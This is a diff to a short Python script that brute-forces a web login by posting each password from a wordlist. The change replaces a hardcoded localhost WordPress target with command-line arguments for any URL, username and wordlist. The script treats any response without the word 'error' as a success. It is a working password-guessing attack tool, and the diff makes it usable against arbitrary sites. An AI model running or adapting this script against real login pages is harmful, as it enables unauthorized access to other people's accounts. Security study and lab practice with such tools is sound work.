@@ -10,12 +10,16 @@ We use a dictionary to brute force the password.
 Author: @raiabril
 """
 
+import sys
 from http.client import HTTPConnection
+
 import requests
+
 from models import Target
 
-pass_file = "wordlists/test-passwords.txt"
-target = Target(url='http://localhost:8080/wp-login.php')
+target = Target(url=sys.argv[1])
+username = sys.argv[2]
+pass_file = sys.argv[3]
 
 
 with open(pass_file) as f:
@@ -24,8 +28,13 @@ with open(pass_file) as f:
         try:
             # Send a post request to the target URL with the password as the payload
             print("[!!] Trying password: " + password)
-            response = requests.post(url=target.url, data={
-                'log': 'admin', 'password': password})
+            response = requests.post(
+                url=target.url,
+                data={
+                    'username': username,
+                    'password': password,
+                    'login': 'Login'},
+                allow_redirects=True)
 
             # Check that the response does not contain error
             if 'error' not in response.text:
